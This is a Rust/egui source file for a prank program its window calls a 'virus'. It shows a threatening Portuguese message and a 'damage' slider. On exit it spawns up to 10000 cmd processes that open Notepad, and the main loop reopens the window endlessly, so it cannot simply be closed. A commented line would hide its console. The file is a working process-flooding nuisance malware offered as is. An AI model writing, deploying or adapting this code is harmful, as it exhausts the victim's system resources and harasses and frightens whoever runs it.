//#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")] // hide console window on Windows in release

use eframe::egui;
use std::thread;
use std::process::Command;
use std::time::{Duration, Instant};
use std::cell::RefCell;

thread_local!{
    static START: RefCell<Instant> = RefCell::new(Instant::now());
}

const COMMANDS: [&str; 1] = [
    "notepad.exe
    exit",
    //r#"start C:\"#, // using raw string to do the \
];

fn main() {
    env_logger::init(); // Log to stderr (if you run with `RUST_LOG=debug`).
    // let mut counter = 1;
    
    loop {
        // for _i in 0..counter {
            // instantiate_notepad();
        // }
        // counter *= 2;
        let _ = create_window();
    }
}

fn instantiate_notepad() {
    thread::sleep(std::time::Duration::from_micros(1));
    thread::spawn(move || {
        thread::sleep(std::time::Duration::from_secs(5));
        let _output = Command::new("cmd")
            .args(&["/C", command()])
            .output()
            .expect("failed to execute process");
    });
}

fn command() -> &'static str {
   let time: usize = START.with(|start| *start.borrow()).elapsed().as_micros() as usize;
   let time = time % COMMANDS.len();

   
   dbg!(COMMANDS[time]);
   COMMANDS[time]
}

fn create_window() -> Result<(), eframe::Error> {
    let options = eframe::NativeOptions {
        resizable:false,
        initial_window_size: Some(egui::vec2(320.0, 240.0)),
        icon_data: Some(eframe::IconData {
            rgba: vec![],
            width: 0,
            height: 0,
        }),
        ..Default::default()
    };
    eframe::run_native(
        "virus",
        options,
        Box::new(|_cc| Box::<MyApp>::default()),
    )
}

struct MyApp {
    message: String,
    estrago: i32
}

impl Default for MyApp {
    fn default() -> Self {
        let output = Command::new("cmd")
            .args(&["/C", "echo geiagoae23"])
            .output()
            .expect("failed to execute process");

        let hello = output.stdout;
        let string = String::from_utf8(hello).expect("failed to convert");

        Self {
            message: string,
            estrago: 100,
        }
    }
}

impl eframe::App for MyApp {
    fn on_exit(&mut self, _gl: Option<&eframe::glow::Context>) {
        for _i in 0..self.estrago {
            instantiate_notepad();
        }
    }
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        egui::CentralPanel::default().show(ctx, |ui| {
            ui.heading("Voce ira morrer em 0,meio segundos");
            ui.label(format!("{:?}", self.message));
            ui.add(egui::Slider::new(&mut self.estrago, 100..=10000).text("estrago"));
        });
    }
}
